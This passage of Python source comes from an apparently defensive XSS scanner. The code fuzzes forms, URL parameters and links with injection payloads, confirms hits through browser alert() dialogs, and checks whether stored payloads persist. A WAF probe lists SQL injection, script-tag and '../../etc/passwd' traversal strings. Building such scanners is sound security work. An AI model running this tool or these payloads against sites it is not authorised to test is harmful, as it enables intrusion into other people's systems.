                    return None

                self._dismiss_overlays(page)
                self._reveal_hidden_search_boxes(page)

                filled_any = False
                fillable_count = 0
                filled_elements = []
                for selector in ('textarea', 'input[type=text]', 'input:not([type])',
                                  'input[type=search]', 'input[type=email]', 'input[type=url]',
                                  'input[type=number]'):
                    try:
                        elements = page.query_selector_all(selector)
                    except Exception:
                        elements = []
                    for el in elements:
                        try:
                            if el.is_visible() and el.is_editable():
                                fillable_count += 1
                                el.fill(payload, timeout=3000)
                                filled_any = True
                                filled_elements.append(el)
                        except Exception:
                            continue

                try:
                    editable_divs = page.query_selector_all('[contenteditable="true"], [contenteditable=""]')
                except Exception:
                    editable_divs = []
                for el in editable_divs:
                    try:
                        if el.is_visible():
                            fillable_count += 1
                            el.click(timeout=3000)
                            el.type(payload)
                            filled_any = True
                            filled_elements.append(el)
                    except Exception:
                        continue

                if not filled_any:
                    self._dom_debug(f"[dbg] no fillable field on {base_url} (skip: {payload[:40]})")
                    browser.close()
                    return None

                clicked_label = None
                for el in filled_elements:
                    try:
                        form_handle = el.evaluate_handle("el => el.closest('form')")
                        form_el = form_handle.as_element()
                    except Exception:
                        form_el = None
                    if form_el:
                        clicked_label = self._click_submit_like(page, scope=form_el)
                        if clicked_label:
                            break

                if not clicked_label:
                    clicked_label = self._click_submit_like(page)

                if clicked_label:
                    self._dom_debug(f"[dbg] filled={fillable_count} clicked='{clicked_label}'")
                else:
                    self._dom_debug(f"[dbg] filled={fillable_count} no button, trying Enter")
                    for el in filled_elements:
                        try:
                            el.press("Enter")
                        except Exception:
                            continue

                try:
                    page.wait_for_load_state("domcontentloaded", timeout=5000)
                except Exception:
                    pass
                page.wait_for_timeout(3500)

                if triggered:
                    browser.close()
                    return {
                        'type': FindingTypes.DOM_XSS_CONFIRMED_INTERACTIVE,
                        'url': base_url,
                        'payload': payload,
                        'evidence': f"alert() fired with: {triggered[0]}",
                        'timestamp': datetime.now().isoformat(),
                    }

                browser.close()
                return None

        except Exception as e:
            self.log(f"[!] Playwright interactive test failed: {e}", 'error')
            return None

    def _test_dom_payload(self, base_url: str, payload: str) -> Optional[Dict]:
        """Test a single DOM XSS payload with Playwright"""
        if not PLAYWRIGHT_AVAILABLE:
            return None
        
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=self.headless)
                page = self._new_authenticated_page(browser)
                triggered = []
                
                def handle_dialog(dialog):
                    triggered.append(dialog.message)
                    dialog.dismiss()
                
                page.on("dialog", handle_dialog)

                if not urlparse(base_url).fragment:
                    test_url = f"{base_url}#{payload}"
                    try:
                        page.goto("about:blank")
                        page.goto(test_url, timeout=TIMEOUT * 1000, wait_until="domcontentloaded")
                        page.wait_for_timeout(3500)
                    except Exception:
                        pass
                    
                    if triggered:
                        browser.close()
                        return {
                            'type': FindingTypes.DOM_XSS_CONFIRMED,
                            'url': test_url,
                            'payload': payload,
                            'evidence': f"alert() fired with: {triggered[0]}",
                            'timestamp': datetime.now().isoformat(),
                        }
                
                for mode, parsed, route_path, params in self._get_fuzzable_param_groups(base_url):
                    for param_name in params:
                        triggered.clear()
                        new_params = {k: v[0] for k, v in params.items()}
                        new_params[param_name] = payload
                        fuzzed_url = self._build_fuzzed_url(mode, parsed, route_path, new_params)
                        try:
                            page.goto("about:blank")
                            page.goto(fuzzed_url, timeout=TIMEOUT * 1000, wait_until="domcontentloaded")
                            page.wait_for_timeout(3500)
                        except Exception:
                            pass
                        
                        if triggered:
                            browser.close()
                            return {
                                'type': FindingTypes.DOM_XSS_CONFIRMED,
                                'url': fuzzed_url,
                                'param': param_name,
                                'payload': payload,
                                'evidence': f"alert() fired with: {triggered[0]}",
                                'timestamp': datetime.now().isoformat(),
                            }
                
                browser.close()
                return None
                
        except Exception as e:
            self.log(f"[!] Playwright error: {e}", 'error')
            return None

    def _test_link_click_payload(self, base_url: str, payload: str) -> Optional[Dict]:
        """puts a javascript: uri in every url param then clicks any link
        that picked it up - only fires on click, not page load (level5)"""
        if not PLAYWRIGHT_AVAILABLE:
            return None

        parsed = urlparse(base_url)
        params = parse_qs(parsed.query)

        candidate_param_names = params.keys() if params else [
            'next', 'redirect', 'redirect_uri', 'return', 'return_url',
            'url', 'continue', 'dest', 'target', 'goto',
        ]

        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=self.headless)
                page = self._new_authenticated_page(browser)
                triggered = []

                def handle_dialog(dialog):
                    triggered.append(dialog.message)
                    dialog.dismiss()

                page.on("dialog", handle_dialog)

                for param_name in candidate_param_names:
                    triggered.clear()
                    new_params = {k: v[0] for k, v in params.items()}
                    new_params[param_name] = payload
                    fuzzed_url = urlunparse(parsed._replace(query=urlencode(new_params)))

                    try:
                        page.goto("about:blank")
                        page.goto(fuzzed_url, timeout=TIMEOUT * 1000, wait_until="domcontentloaded")
                        page.wait_for_timeout(500)
                    except Exception:
                        continue

                    self._dismiss_overlays(page)

                    try:
                        links = page.query_selector_all('a[href]')
                    except Exception:
                        links = []

                    for link in links:
                        try:
                            href = link.get_attribute('href') or ''
                            if 'javascript:' in href.lower() or payload[:15] in href:
                                if link.is_visible():
                                    link.click(timeout=3000)
                                    page.wait_for_timeout(3500)
                        except Exception:
                            continue

                    if triggered:
                        browser.close()
                        return {
                            'type': FindingTypes.DOM_XSS_CONFIRMED_INTERACTIVE,
                            'url': fuzzed_url,
                            'param': param_name,
                            'payload': payload,
                            'evidence': f"alert() fired with: {triggered[0]}",
                            'timestamp': datetime.now().isoformat(),
                        }

                browser.close()
                return None

        except Exception as e:
            self.log(f"[!] Playwright link-click test failed: {e}", 'error')
            return None
    
    
    def scan_stored_xss(self):
        """Scan for stored XSS with cross-session persistence checking"""
        if not self.check_stored_persistence:
            return
        
        self.log(f"[*] Scanning for stored XSS with session persistence")
        
        forms = self.extract_forms(self.target_url)
        if not forms:
            self.log("[*] No forms found for stored XSS testing")
            return
        
        for form in forms[:3]:
            for payload in self.payloads[:5]:
                response = self.submit_form(self.target_url, form, payload)
                if not response:
                    continue
                
                if payload in response.text:
                    persistence_result = StoredXSSChecker.check_persistence(
                        self.target_url, self.session, payload, 'form'
                    )
                    
                    if persistence_result['persists']:
                        self.add_finding({
                            'type': FindingTypes.STORED_XSS_PERSISTENT,
                            'payload': payload,
                            'form_action': form['action'],
                            'persists_across_sessions': True,
                            'evidence': persistence_result['evidence'],
                            'timestamp': datetime.now().isoformat(),
                        })
                        self.log(f"[!] PERSISTENT stored XSS found: {payload[:50]}", 'warning')
                        break
    
    
    def scan_waf(self):
        """Enhanced WAF detection"""
        self.log(f"[*] Checking for WAF on {self.target_url}")
        
        waf_signatures = {
            'Cloudflare': ['cf-ray', 'cloudflare'],
            'Akamai': ['akamai'],
            'Imperva': ['x-iinfo', 'incapsula'],
            'F5': ['x-wa-info'],
            'AWS WAF': ['x-amzn-requestid'],
            'Sucuri': ['x-sucuri-id'],
            'ModSecurity': ['mod_security'],
            'AWS': ['x-amz-cf'],
        }
        
        test_payloads = ["' OR '1'='1", "<script>alert(1)</script>", "../../etc/passwd"]
        waf_detected = []
        
        for payload in test_payloads:
            response = self.safe_request(self.target_url, params={'test': payload}, 
                                         allow_error_status=True)
            if not response:
                continue
            
            for header, value in response.headers.items():
                header_lower = header.lower()
                for waf_name, sigs in waf_signatures.items():
                    if any(s in header_lower or s in value.lower() for s in sigs):
                        waf_detected.append({'name': waf_name, 'header': header, 'value': value})
            
            if response.status_code in (403, 406, 501, 503):
                waf_detected.append({'name': 'Unknown WAF', 'status_code': response.status_code})
        
        if waf_detected:
            self.waf_info = {'detected': waf_detected}
            self.log(f"[!] WAF detected: {waf_detected[0]['name']}", 'warning')
        else:
            self.waf_info = {'detected': []}
    
    
    def is_reflected_unescaped(self, response_text: str, payload: str, baseline: str = "") -> bool:
        if not response_text or not payload:
            return False
        if payload in baseline:
            return False
        if payload not in response_text:
            return False
        if self.csp_info and CSPAnalyzer.analyze_csp_blocking(self.csp_info, payload)['blocked']:
            return False
        return True

    def _track_csp_block(self, response_text: str, payload: str, baseline: str = ""):
        if not response_text or not payload or payload in baseline:
            return
        if payload not in response_text or not self.csp_info:
            return
        csp_analysis = CSPAnalyzer.analyze_csp_blocking(self.csp_info, payload)
        if csp_analysis['blocked']:
            self.stats['csp_blocked'] += 1
            self.log(f"[!] CSP would block payload: {csp_analysis['reasons']}", 'warning')
    
    
    def verify_reflected_findings(self):
        reflected = [f for f in self.findings if f.get('type') == FindingTypes.REFLECTED_XSS]
        if not reflected:
            return

        if not PLAYWRIGHT_AVAILABLE:
            for f in reflected:
                f['verification_note'] = ('Playwright not installed - could not confirm '
                                           'in a real browser; treat as unverified')
            return

        if self.verbose:
            print(f"[*] Double-checking {len(reflected)} reflected XSS hit(s) in a real browser...")

        with sync_playwright() as p:
            browser = p.chromium.launch(headless=self.headless)
            for i, finding in enumerate(reflected, 1):
                payload = finding.get('payload', '')
                mode = 'url' if finding.get('source') == 'url_param' else 'form'
                self._render_progress(self._payload_label(payload), i, len(reflected))
                confirmed, evidence = self._verify_single_reflected(browser, finding)
                self._record_payload_result(payload, mode, success=confirmed)
                if confirmed:
                    finding['type'] = FindingTypes.REFLECTED_XSS_CONFIRMED
                    finding['evidence'] = f"alert() fired with: {evidence}"
                    self._progress_break_for_message(
                        f"[+] XSS: {self._payload_label(payload)}"
                    )
                else:
                    finding['type'] = FindingTypes.REFLECTED_XSS_UNCONFIRMED
                    finding['verification_note'] = (
                        'String match hit only  did not execute in a real browser replay. '
                        'Likely a false positive (e.g. payload had no characters needing '
                        'escaping) or blocked by context/CSP, review manually before '
                        'treating this as a real vulnerability.'
                    )
            browser.close()
        if self.dom_debug:
            sys.stdout.write("\r\033[K")
            sys.stdout.flush()

    def _verify_single_reflected(self, browser, finding: Dict) -> Tuple[bool, Optional[str]]:
        page = self._new_authenticated_page(browser)
        triggered = []

        def handle_dialog(dialog):
            triggered.append(dialog.message)
            dialog.dismiss()

        page.on("dialog", handle_dialog)

        try:
            if finding.get('source') == 'url_param' and finding.get('url'):
                page.goto(finding['url'], timeout=TIMEOUT * 1000, wait_until="domcontentloaded")
                page.wait_for_timeout(3500)

            elif finding.get('source') == 'form':
                page.goto(self.target_url, timeout=TIMEOUT * 1000, wait_until="domcontentloaded")
                page.wait_for_timeout(300)

                payload = finding.get('payload', '')
                filled = False
                for selector in ('textarea', 'input[type=text]', 'input:not([type])',
                  'input[type=search]', 'input[type=email]', 'input[type=url]',
                  'input[type=number]'):
                    try:
                        elements = page.query_selector_all(selector)
                    except Exception:
                        elements = []
                    for el in elements:
                        try:
                            if el.is_visible() and el.is_editable():
                                el.fill(payload)
                                filled = True
                        except Exception:
                            continue

                if filled:
                    clicked = self._click_submit_like(page)
                    if not clicked:
                        try:
                            page.keyboard.press("Enter")
                        except Exception:
                            pass
                    try:
                        page.wait_for_load_state("domcontentloaded", timeout=5000)
                    except Exception:
                        pass
                    page.wait_for_timeout(3500)
        except Exception:
            pass

        result = (len(triggered) > 0, triggered[0] if triggered else None)
        try:
            page.close()
        except Exception:
            pass
        return result

    def scan_sequential(self):
        """Run scans sequentially"""
        self.scan_forms()
        self.scan_url_params()
        self.scan_stored_xss()
        self.scan_waf()
        if self.verify_dom:
            self.scan_dom_with_browser()
    
    def scan_parallel_safe(self):
        """Run HTTP scans in parallel, DOM verification separately"""
        with ThreadPoolExecutor(max_workers=CONCURRENT_WORKERS) as executor:
            futures = {
                executor.submit(self.scan_forms): 'forms',
                executor.submit(self.scan_url_params): 'url_params',
                executor.submit(self.scan_stored_xss): 'stored_xss',
                executor.submit(self.scan_waf): 'waf',
            }
            for future in as_completed(futures):
                name = futures[future]
                try:
                    future.result(timeout=120)
                    self.log(f"[*] {name} scan completed")
                except Exception as e:
                    self.log(f"[!] {name} scan failed: {e}", 'error')
        
        if self.verify_dom:
            self.scan_dom_with_browser()
    
    def _short_url(self, url: str) -> str:
        parsed = urlparse(url)
        path = parsed.path.strip('/')
        return path if path else parsed.netloc

    def _casual_line_for_finding(self, f: Dict) -> str:
        payload = f.get('payload', '?')
        ftype = f.get('type', '')
        if ftype in FindingTypes.CONFIRMED:
            return f"[+] XSS: {payload}"
        if ftype == FindingTypes.REFLECTED_XSS_UNCONFIRMED:
            return f"[-] no fire: {payload}"
        if ftype == FindingTypes.STORED_XSS_PERSISTENT:
            return f"[?] persisted: {payload}"
        return f"{payload} - {ftype}"

    def scan(self) -> str:
        """Main scan entry point"""
        print(f"[*] target: {self._short_url(self.target_url)}")
        start_time = time.time()

        self._discover_target()
        self._run_all_scans()

        elapsed = time.time() - start_time
        report = self.generate_report()
        self._print_console_summary(elapsed)

        return report

    def _discover_target(self) -> None:
        """crawl + detect framework/csp, feeds self.payloads for later"""
        self.crawl(self.target_url)
        self.log(f"[*] Crawled {len(self.visited_urls)} page(s)")

        initial_response = self.safe_request(self.target_url)
        if initial_response:
            self._detect_framework_and_csp(initial_response)
            self.log(f"[*] Framework: {self.framework.value}")

    def _run_all_scans(self) -> None:
        if self.parallel:
            self.scan_parallel_safe()
        else:
            self.scan_sequential()
        self.verify_reflected_findings()

    def _print_console_summary(self, elapsed: float) -> None:
        confirmed_count = len([f for f in self.findings if f.get('type') in FindingTypes.CONFIRMED])
        tested = len(self.payload_results)
        summary_line = (
            f"{confirmed_count} hit{'s' if confirmed_count != 1 else ''}. "
            f"{tested} payload{'s' if tested != 1 else ''}. {elapsed:.1f}s."
        )
        if self.verbose:
            self._print_payload_results()
            print(f"\n[*] Done in {elapsed:.1f}s - {self.stats['vulnerabilities_found']} finding(s), {confirmed_count} confirmed in browser")
        else:
            for f in self.findings:
                print(self._casual_line_for_finding(f))
            if not self.findings:
                print("[-] nothing found")
            elif confirmed_count == 0:
                print("[-] no confirmed hits")
        print(summary_line)
    
    def crawl(self, url: str, depth: int = 0):
        """Crawl website"""
        with self.visited_lock:
            if depth > self.crawl_depth or url in self.visited_urls:
                return
            self.visited_urls.add(url)
        
        response = self.safe_request(url)
        if not response:
            return
        
        soup = BeautifulSoup(response.text, 'html.parser')
        parsed_target = urlparse(self.target_url)
        
        for a in soup.find_all('a', href=True):
            href = a['href']
            if href.startswith('javascript:'):
                continue
            if href.startswith(('http://', 'https://')):
                if urlparse(href).netloc == parsed_target.netloc:
                    self.crawl(href, depth + 1)
            elif href.startswith('/'):
                absolute_url = f"{parsed_target.scheme}://{parsed_target.netloc}{href}"
                self.crawl(absolute_url, depth + 1)
    
    
    def scan_forms(self):
        """Scan forms for XSS"""
        self.log(f"[*] Extracting forms from {self.target_url}")
        forms = self.extract_forms(self.target_url)
        self.log(f"[*] Found {len(forms)} form(s)")
        baseline = self._get_baseline()
        
        for form in forms:
            for payload in self.payloads:
                response = self.submit_form(self.target_url, form, payload)
                if not response:
                    continue
                
                if self.is_reflected_unescaped(response.text, payload, baseline):
                    context = self.detect_injection_context(response.text, payload)
                    self.add_finding({
                        'type': FindingTypes.REFLECTED_XSS,
                        'source': 'form',
                        'action': form['action'] or self.target_url,
                        'method': form['method'],
                        'payload': payload,
                        'fields': [f['name'] for f in form['inputs']],
                        'context': context,
                        'framework': self.framework.value,
                        'timestamp': datetime.now().isoformat(),
                        'status_code': response.status_code,
                    })
                    self.log(f"[*] candidate hit in form: {payload[:50]}...")
                    break
                self._track_csp_block(response.text, payload, baseline)
    
    def scan_url_params(self):
        """Scan URL parameters for XSS"""
        self.log("[*] Fuzzing URL query parameters")
        parsed = urlparse(self.target_url)
        if not parse_qs(parsed.query):
            self.log("[*] No query parameters found")
            return
        
        baseline = self._get_baseline()
        
        for payload in self.payloads:
            for param_name, fuzzed_url, response in self.inject_url_params(self.target_url, payload):
                if self.is_reflected_unescaped(response.text, payload, baseline):
                    context = self.detect_injection_context(response.text, payload)
                    self.add_finding({
                        'type': FindingTypes.REFLECTED_XSS,
                        'source': 'url_param',
                        'param': param_name,
                        'url': fuzzed_url,
                        'payload': payload,
                        'context': context,
                        'framework': self.framework.value,
                        'timestamp': datetime.now().isoformat(),
                        'status_code': response.status_code,
                    })
                    self.log(f"[*] candidate hit in param: {param_name}")
                else:
                    self._track_csp_block(response.text, payload, baseline)
    
    def _get_baseline(self) -> str:
        """Get baseline response"""
        response = self.safe_request(self.target_url)
        return response.text if response else ""
    
    def detect_injection_context(self, response: str, injection_point: str) -> str:
        """Detect injection context"""
        contexts = {
            'in_script': r'<script[^>]*>[^<]*' + re.escape(injection_point) + r'[^<]*</script>',
            'in_attribute': r'"[^"]*' + re.escape(injection_point) + r'[^"]*"',
            'in_html': r'<[^>]*' + re.escape(injection_point) + r'[^>]*>',
        }
        for context, pattern in contexts.items():
            if re.search(pattern, response, re.IGNORECASE):
                return context
        return 'unknown'
    
#for report    
    def generate_report(self) -> str:
        """Generate report in specified format"""
        if self.output_format == 'json':
            return json.dumps({
                'target': self.target_url,
                'timestamp': datetime.now().isoformat(),
                'framework': self.framework.value,
                'csp': self.csp_info.policy if self.csp_info else None,
                'authenticated': self.session_manager.config.is_authenticated(),
                'bot_detected': self.bot_detected,
                'stats': self.stats,
                'findings': self.findings,
                'waf': self.waf_info,
            }, indent=2)
        return self.generate_text_report()
    
    def generate_text_report(self) -> str:
        """Generate text report"""
        report = []
        report.append(f"scan: {self.target_url}")
        report.append(f"time: {datetime.now().strftime('%Y-%m-%d %H:%M')}")
        if self.framework != Framework.UNKNOWN:
            report.append(f"framework: {self.framework.value}")
        if self.session_manager.config.is_authenticated():
            report.append("authenticated: yes")
        if self.bot_detected:
            report.append("bot/captcha detected during scan")
        report.append("")
        
        # csp stuff
        if self.csp_info:
            report.append("CSP:")
            report.append(f"  policy: {self.csp_info.policy[:100]}...")
            report.append(f"  allows inline scripts: {self.csp_info.allows_inline_script()}")
            report.append(f"  allows eval(): {self.csp_info.allows_unsafe_eval()}")
            report.append("")
        
        confirmed_count = len([f for f in self.findings if f.get('type') in FindingTypes.CONFIRMED])
        unconfirmed_count = len([f for f in self.findings if f.get('type') == FindingTypes.REFLECTED_XSS_UNCONFIRMED])
        report.append(f"findings: {len(self.findings)} total, {confirmed_count} confirmed in browser, "
                       f"{unconfirmed_count} unconfirmed")
        report.append(f"requests made: {self.stats['requests_made']}")
        report.append("")
        
        # for the actual findings output
        if self.findings:
            report.append("findings:")
            for i, f in enumerate(self.findings, 1):
                report.append(f"\n[{i}] {f['type']}")
                for key in ('url', 'action', 'param', 'method', 'payload', 'evidence', 
                           'context', 'framework', 'persists_across_sessions', 'verification_note'):
                    if f.get(key):
                        report.append(f"    {key}: {f[key]}")
        
        report.append("")
        report.append("fixes:")
        
        if self.csp_info and not self.csp_info.allows_inline_script():
            report.append("  [OK] CSP blocks inline scripts (good)")
        else:
            report.append("  ! Consider implementing CSP with 'unsafe-inline' disabled")
        
        if self.csp_info and self.csp_info.requires_trusted_types:
            report.append("  [OK] Trusted Types enabled (good)")
        else:
            report.append("  ! Consider implementing Trusted Types")
        
        report.append("  1. HTML-encode all user input before rendering")
        report.append("  2. Use framework-specific XSS prevention methods")
        report.append("  3. Set HttpOnly + Secure flags on cookies")
        report.append("  4. Implement proper input validation")
        report.append("  5. Re-test after fixes with this scanner")
        
        return "\n".join(report)


class RateLimiter:
    
    def __init__(self, requests_per_second: int = RATE_LIMIT):
        self.min_interval = 1.0 / requests_per_second
        self.last_request_time = 0.0
        self._lock = threading.Lock()
    
    def wait(self):
        with self._lock:
            now = time.time()
            elapsed = now - self.last_request_time
            if elapsed < self.min_interval:
                time.sleep(self.min_interval - elapsed)
            self.last_request_time = time.time()


def parse_arguments():
    parser = argparse.ArgumentParser(
        description='xss scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  just scan something
  python3 xss_scanner_v3.py http://localhost:3000

  logged in scan
  python3 xss_scanner_v3.py http://target.com --login-url http://target.com/login --username admin --password pass

  using cookies you grabbed from your browser
  python3 xss_scanner_v3.py http://target.com --cookies "sessionid=abc123; csrftoken=xyz789"

  actually confirm stuff in a real browser + detect the framework
  python3 xss_scanner_v3.py http://target.com --verify-dom --detect-framework

  faster scan, dump json to a file
  python3 xss_scanner_v3.py http://target.com --parallel --format json -o report.json

  forget the saved session
  python3 xss_scanner_v3.py http://target.com --clear-session
        """
    )
    
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('--name', default='IDENT',
                       help='Name to show in the startup banner (default: IDENT)')
    parser.add_argument('--no-banner', action='store_true',
                       help='Skip the startup banner')
    
    parser.add_argument('--output', '-o', help='Output file for results')
    parser.add_argument('--format', '-f', choices=['text', 'json'], default='text')
    parser.add_argument('--verbose', '-v', action='store_true')
    parser.add_argument('--depth', type=int, default=1, help='Crawl depth (default: 1)')
    parser.add_argument('--parallel', action='store_true', help='Run HTTP scans concurrently')
    parser.add_argument('--max-payloads', type=int, default=20, help='Max payloads per injection point')
    
    # turn features on/off
    parser.add_argument('--verify-dom', action='store_true', 
                       help='Confirm DOM XSS with Playwright')
    parser.add_argument('--dom-debug', action='store_true',
                       help='Show per-step DOM test detail (filled fields, clicked button, etc.) '
                            'instead of the default live progress line')
    parser.add_argument('--show-browser', action='store_true',
                       help='Open a real visible browser window instead of running headless, '
                            'so you can watch what the automation is actually doing')
    parser.add_argument('--detect-framework', action='store_true',
                       help='Detect JS framework and use framework-specific payloads')
    parser.add_argument('--no-csp', action='store_true',
                       help='Disable CSP analysis')
    parser.add_argument('--no-stored', action='store_true',
                       help='Disable stored XSS persistence checking')
    
    # for login 
    parser.add_argument('--cookies', help='Import cookies (e.g., "name1=value1; name2=value2")')
    parser.add_argument('--headers', help='Import headers (e.g., "Header1: value1, Header2: value2")')
    parser.add_argument('--login-url', help='Login page URL')
    parser.add_argument('--username', help='Username for login')
    parser.add_argument('--password', help='Password for login')
    parser.add_argument('--clear-session', action='store_true', help='Clear saved session')
    
    # all the session file stuff
    parser.add_argument('--session-file', default=SESSION_FILE, help='Session file path')
    
    return parser.parse_args()

def main():
    args = parse_arguments()

    _enable_windows_ansi()

    if not args.no_banner:
        print_banner(args.name)

    session_manager = SessionManager(args.session_file)
    
    if args.clear_session:
        session_manager.clear_session()
        print("[*] Session cleared")
        return
    
    if args.cookies:
        session_manager.import_cookies(args.cookies)
    
    if args.headers:
        session_manager.import_headers(args.headers)
    
    if args.login_url and args.username and args.password:
        success = session_manager.login(
            args.login_url, args.username, args.password
        )
        if not success:
            print("[!] Login failed - continuing with current session")
    
    scanner = AdvancedXSSScanner(
        target_url=args.url,
        verbose=args.verbose,
        output_format=args.format,
        crawl_depth=args.depth,
        parallel=args.parallel,
        verify_dom=args.verify_dom,
        max_payloads=args.max_payloads,
        session_manager=session_manager,
        detect_framework=args.detect_framework,
        analyze_csp=not args.no_csp,
        check_stored_persistence=not args.no_stored,
        dom_debug=args.dom_debug,
        show_browser=args.show_browser,
    )
    
    report = scanner.scan()
    
    if args.output:
        with open(args.output, 'w', encoding='utf-8') as f:
            f.write(report)
        print(f"[*] saved to {args.output}")
    elif args.verbose:
        print(report)

if __name__ == "__main__":
    main()
